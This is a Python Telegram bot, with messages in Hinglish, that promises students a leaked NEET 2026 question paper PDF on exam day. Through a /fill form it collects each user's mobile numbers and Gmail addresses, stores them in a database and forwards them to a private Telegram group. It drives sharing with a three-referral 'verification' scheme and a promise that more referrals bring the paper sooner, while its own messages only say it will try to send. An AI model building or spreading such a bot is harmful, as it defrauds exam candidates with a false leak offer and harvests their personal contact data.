import os
import asyncio
import logging
import asyncpg
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ["TELEGRAM_BOT_TOKEN"]
GROUP_CHAT_ID = int(os.environ["TELEGRAM_GROUP_CHAT_ID"])
DATABASE_URL = os.environ["DATABASE_URL"]

MOBILE, ALT_MOBILE, GMAIL, ALT_GMAIL = range(4)

db_pool = None


async def get_db():
    global db_pool
    if db_pool is None:
        db_pool = await asyncpg.create_pool(DATABASE_URL)
    return db_pool


async def ensure_user(user_id: int, username: str, first_name: str, last_name: str, referred_by: int = None):
    pool = await get_db()
    async with pool.acquire() as conn:
        existing = await conn.fetchrow("SELECT user_id FROM bot_users WHERE user_id = $1", user_id)
        if not existing:
            await conn.execute(
                """
                INSERT INTO bot_users (user_id, username, first_name, last_name, referred_by)
                VALUES ($1, $2, $3, $4, $5)
                ON CONFLICT (user_id) DO NOTHING
                """,
                user_id, username, first_name, last_name, referred_by
            )
            if referred_by and referred_by != user_id:
                try:
                    await conn.execute(
                        "INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT DO NOTHING",
                        referred_by, user_id
                    )
                except Exception:
                    pass


async def get_referral_count(user_id: int) -> int:
    pool = await get_db()
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT COUNT(*) as cnt FROM referrals WHERE referrer_id = $1", user_id)
        return row["cnt"] if row else 0


async def is_verified(user_id: int) -> bool:
    pool = await get_db()
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT is_verified FROM bot_users WHERE user_id = $1", user_id)
        return row["is_verified"] if row else False


async def mark_verified(user_id: int):
    pool = await get_db()
    async with pool.acquire() as conn:
        await conn.execute(
            "UPDATE bot_users SET is_verified = TRUE, verified_at = NOW() WHERE user_id = $1",
            user_id
        )


async def check_and_notify_referrer(context, referred_by: int):
    if not referred_by:
        return
    count = await get_referral_count(referred_by)
    already_verified = await is_verified(referred_by)
    if count >= 3 and not already_verified:
        await mark_verified(referred_by)
        try:
            await context.bot.send_message(
                chat_id=referred_by,
                text=(
                    "🎉 *Congratulations! Aap Verified Ho Gaye!*\n\n"
                    "Thank you! Aapke 3 unique referrals complete ho gaye hain.\n\n"
                    "✅ *Ab aap verified hain!* Agar possible hua, to hum aapko *2 May 2026 ko raat 10 baje* "
                    "NEET 2026 Question Paper ki PDF bhej denge.\n\n"
                    "📢 *Yaad rahe:* Jitna zyada aap refer karenge, utna jaldi aapko paper send kiya jaayega! "
                    "Referral karte rahiye aur apna chance badhaiye! 🚀"
                ),
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Failed to send verification message to {referred_by}: {e}")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    referred_by = None

    if context.args:
        try:
            referred_by = int(context.args[0])
        except ValueError:
            referred_by = None

    await ensure_user(
        user_id=user.id,
        username=user.username or "",
        first_name=user.first_name or "",
        last_name=user.last_name or "",
        referred_by=referred_by
    )

    if referred_by:
        await check_and_notify_referrer(context, referred_by)

    bot_username = (await context.bot.get_me()).username
    referral_link = f"https://t.me/{bot_username}?start={user.id}"

    welcome_text = (
        f"🙏 *Namaste {user.first_name}!*\n\n"
        "📚 *NEET 2026 Question Paper Bot mein aapka swagat hai!*\n\n"
        "📅 *2 May 2026 ko aapko NEET ka paper send kiya jaayega.*\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📩 *PDF kaise paye?*\n"
        "Agar aap bhi NEET 2026 Questions Paper ki PDF chahte hain, "
        "to /fill pe click karke apni details bhej dein — "
        "hum aapko PDF send kar denge!\n\n"
        "🔗 *Apna Referral Link:*\n"
        f"`{referral_link}`\n\n"
        "👥 *3 unique users ko refer karo aur verified ban jao!*\n"
        "Jitna zyada refer karoge, utna jaldi paper milega! 🚀"
    )

    await update.message.reply_text(welcome_text, parse_mode="Markdown")


async def fill_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await ensure_user(
        user_id=user.id,
        username=user.username or "",
        first_name=user.first_name or "",
        last_name=user.last_name or ""
    )

    await update.message.reply_text(
        "📝 *Details Form - Step 1/4*\n\n"
        "📱 *Apna Mobile Number bhejein* jis par PDF send ki jaayegi:\n\n"
        "_(Sirf number likhein, jaise: 9876543210)_",
        parse_mode="Markdown"
    )
    return MOBILE


async def received_mobile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mobile = update.message.text.strip()
    if not mobile.isdigit() or len(mobile) < 8 or len(mobile) > 15:
        await update.message.reply_text(
            "❌ *Invalid number!* Kripya sirf digits mein valid mobile number bhejein.\n\n"
            "_(Jaise: 9876543210)_",
            parse_mode="Markdown"
        )
        return MOBILE

    context.user_data["mobile"] = mobile

    keyboard = [[InlineKeyboardButton("⏭️ /skip", callback_data="skip_alt_mobile")]]
    await update.message.reply_text(
        "✅ Mobile number save ho gaya!\n\n"
        "📝 *Step 2/4*\n\n"
        "📱 *Alternative Mobile Number* (optional):\n"
        "Koi doosra number bhejein ya /skip karein:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return ALT_MOBILE


async def received_alt_mobile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()

    if text == "/skip":
        context.user_data["alt_mobile"] = ""
    else:
        if not text.isdigit() or len(text) < 8 or len(text) > 15:
            await update.message.reply_text(
                "❌ *Invalid number!* Kripya valid mobile number bhejein ya /skip karein.",
                parse_mode="Markdown"
            )
            return ALT_MOBILE
        context.user_data["alt_mobile"] = text

    await update.message.reply_text(
        "✅ Saved!\n\n"
        "📝 *Step 3/4*\n\n"
        "📧 *Apna Gmail address bhejein* jahan NEET 2026 Question Paper PDF bheja jaayega:",
        parse_mode="Markdown"
    )
    return GMAIL


async def received_gmail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    gmail = update.message.text.strip().lower()

    if "@" not in gmail or "." not in gmail:
        await update.message.reply_text(
            "❌ *Invalid email!* Kripya valid Gmail address bhejein.\n\n"
            "_(Jaise: yourname@gmail.com)_",
            parse_mode="Markdown"
        )
        return GMAIL

    context.user_data["gmail"] = gmail

    keyboard = [[InlineKeyboardButton("⏭️ /skip", callback_data="skip_alt_gmail")]]
    await update.message.reply_text(
        "✅ Gmail save ho gaya!\n\n"
        "📝 *Step 4/4*\n\n"
        "📧 *Alternative Gmail* (optional):\n"
        "Koi doosra Gmail bhejein ya /skip karein:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return ALT_GMAIL


async def received_alt_gmail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()

    if text == "/skip":
        context.user_data["alt_gmail"] = ""
    else:
        if "@" not in text or "." not in text:
            await update.message.reply_text(
                "❌ *Invalid email!* Kripya valid Gmail bhejein ya /skip karein.",
                parse_mode="Markdown"
            )
            return ALT_GMAIL
        context.user_data["alt_gmail"] = text

    await save_and_finish(update, context)
    return ConversationHandler.END


async def skip_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text == "/skip":
        state = context.user_data.get("_state")
        if state == ALT_MOBILE:
            context.user_data["alt_mobile"] = ""
            await update.message.reply_text(
                "✅ Skip kiya!\n\n"
                "📝 *Step 3/4*\n\n"
                "📧 *Apna Gmail address bhejein* jahan NEET 2026 Question Paper PDF bheja jaayega:",
                parse_mode="Markdown"
            )
            return GMAIL
        elif state == ALT_GMAIL:
            context.user_data["alt_gmail"] = ""
            await save_and_finish(update, context)
            return ConversationHandler.END


async def save_and_finish(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    mobile = context.user_data.get("mobile", "")
    alt_mobile = context.user_data.get("alt_mobile", "")
    gmail = context.user_data.get("gmail", "")
    alt_gmail = context.user_data.get("alt_gmail", "")

    pool = await get_db()
    async with pool.acquire() as conn:
        await conn.execute(
            """
            UPDATE bot_users
            SET mobile = $1, alt_mobile = $2, gmail = $3, alt_gmail = $4, data_submitted = TRUE
            WHERE user_id = $5
            """,
            mobile, alt_mobile, gmail, alt_gmail, user.id
        )

    bot_username = (await context.bot.get_me()).username
    referral_link = f"https://t.me/{bot_username}?start={user.id}"

    username_display = f"@{user.username}" if user.username else f"{user.first_name or ''} {user.last_name or ''}".strip()
    full_name = f"{user.first_name or ''} {user.last_name or ''}".strip()

    forward_text = (
        f"📋 *Naya User Data Received!*\n\n"
        f"👤 *User:* {full_name}\n"
        f"🔖 *Username:* {username_display}\n"
        f"🆔 *User ID:* `{user.id}`\n\n"
        f"📱 *Mobile:* `{mobile}`\n"
        f"📱 *Alt Mobile:* `{alt_mobile if alt_mobile else 'N/A'}`\n"
        f"📧 *Gmail:* `{gmail}`\n"
        f"📧 *Alt Gmail:* `{alt_gmail if alt_gmail else 'N/A'}`\n"
    )

    try:
        await context.bot.send_message(
            chat_id=GROUP_CHAT_ID,
            text=forward_text,
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Failed to forward data to group: {e}")

    ref_count = await get_referral_count(user.id)
    refs_needed = max(0, 3 - ref_count)

    thank_you_text = (
        "🎉 *Shukriya! Aapki details successfully save ho gayi!*\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📅 *2 May 2026 raat 10 baje* aapko NEET 2026 Question Paper ki PDF bhejne ki koshish ki jaayegi.\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔗 *Verification ke liye Referral karein!*\n\n"
        "Ab *3 unique users* ko is bot ke paas refer karo *verified* hone ke liye:\n\n"
        f"`{referral_link}`\n\n"
        f"📊 *Aapki current referrals:* {ref_count}/3\n"
    )

    if refs_needed > 0:
        thank_you_text += f"⚡ *{refs_needed} aur referral(s)* chahiye verification ke liye!\n\n"
    else:
        thank_you_text += "✅ *Aap already verified ho sakte hain!*\n\n"

    thank_you_text += (
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💡 *Yaad rahe:* Jitna zyada aap refer karenge, *utna jaldi* aapko paper send kiya jaayega! 🚀"
    )

    await update.message.reply_text(thank_you_text, parse_mode="Markdown")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "❌ Form cancel ho gaya. /fill type karke dobara shuru kar sakte hain.",
        parse_mode="Markdown"
    )
    return ConversationHandler.END


async def referral_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await ensure_user(
        user_id=user.id,
        username=user.username or "",
        first_name=user.first_name or "",
        last_name=user.last_name or ""
    )

    bot_username = (await context.bot.get_me()).username
    referral_link = f"https://t.me/{bot_username}?start={user.id}"
    ref_count = await get_referral_count(user.id)
    verified = await is_verified(user.id)

    status_text = (
        f"📊 *Aapka Referral Status*\n\n"
        f"👥 *Total Referrals:* {ref_count}/3\n"
        f"✅ *Verified:* {'Haan! ✅' if verified else 'Nahi (3 referrals chahiye)'}\n\n"
        f"🔗 *Aapka Referral Link:*\n`{referral_link}`\n\n"
        f"💡 Jitna zyada refer karenge, utna jaldi paper milega! 🚀"
    )

    await update.message.reply_text(status_text, parse_mode="Markdown")


def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("fill", fill_start)],
        states={
            MOBILE: [MessageHandler(filters.TEXT & ~filters.COMMAND, received_mobile)],
            ALT_MOBILE: [
                CommandHandler("skip", lambda u, c: handle_skip_alt_mobile(u, c)),
                MessageHandler(filters.TEXT & ~filters.COMMAND, received_alt_mobile),
            ],
            GMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, received_gmail)],
            ALT_GMAIL: [
                CommandHandler("skip", lambda u, c: handle_skip_alt_gmail(u, c)),
                MessageHandler(filters.TEXT & ~filters.COMMAND, received_alt_gmail),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("status", referral_status))

    logger.info("Bot starting...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


async def handle_skip_alt_mobile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["alt_mobile"] = ""
    await update.message.reply_text(
        "✅ Skip kiya!\n\n"
        "📝 *Step 3/4*\n\n"
        "📧 *Apna Gmail address bhejein* jahan NEET 2026 Question Paper PDF bheja jaayega:",
        parse_mode="Markdown"
    )
    return GMAIL


async def handle_skip_alt_gmail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["alt_gmail"] = ""
    await save_and_finish(update, context)
    return ConversationHandler.END


if __name__ == "__main__":
    main()
